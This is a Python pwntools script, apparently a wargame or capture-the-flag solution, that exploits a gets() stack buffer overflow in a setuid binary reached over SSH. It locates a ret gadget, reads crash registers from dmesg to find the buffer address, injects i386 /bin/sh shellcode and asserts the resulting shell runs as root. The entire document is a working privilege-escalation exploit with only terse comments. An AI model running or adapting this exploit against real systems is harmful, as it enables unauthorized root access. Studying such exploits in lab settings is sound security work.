from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

# locate a gadget to use to jump to our shellcode
lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, local=lbin)
e = ELF(lbin)
rop = ROP(e)
gadget_addr = rop.find_gadget(['ret']).address
log.info('gadget_addr: %08x', gadget_addr)

# trigger a crash with a pattern
p = s.system(args.BIN)
p.recv()
p.sendline(cyclic(0x100))
p.recvline()
assert p.recvline() == 'Segmentation fault\n'
p.close()

# get ip and sp value at crash time
p = s.system('dmesg | grep %s | tail -n 1' % op.basename(args.BIN))
p.recvuntil('segfault at ')
report = p.recvline().split()
assert (report[1], report[3]) == ('ip', 'sp')
ip, sp = int(report[2], 16), int(report[4], 16)
log.info('ip: %08x', ip)
log.info('sp: %08x', sp)
p.close()

x = (sp - 8) - 0x4c  # user buffer before call to gets()
ip_off = cyclic_find(ip)
sh = asm(shellcraft.i386.linux.sh())
payload = fit({0: sh, ip_off: gadget_addr, ip_off + 4: x})

p = s.system(args.BIN)
p.recv()
p.sendline(payload)
p.recv()  # read prompt
p.sendline('whoami')
whoami = p.recvline().strip()
log.info('whoami: %s', whoami)
assert whoami == 'root'
